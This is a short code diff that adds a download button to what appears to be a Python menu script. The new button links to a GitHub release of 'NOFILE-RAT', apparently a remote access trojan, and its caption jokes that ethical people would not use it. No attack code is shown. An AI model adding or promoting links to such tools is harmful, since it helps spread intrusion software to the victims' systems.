@@ -137,3 +137,10 @@ create_button(
     "BETA",
     "https://drive.google.com/file/d/1ZeudGupidcExDV_Qzlj0CC4g-bwQkpCq/view?usp=drive_link"
 )
+
+create_button(
+    "NOFILE R47",
+    "NOFILE R47",
+    "Ethical people shouldn't use this. Though, I doubt you'll find anyone like that anywhere.",
+    "https://github.com/nofileteams/NOFILE-RAT/releases/tag/NOFILE-R47"
+)
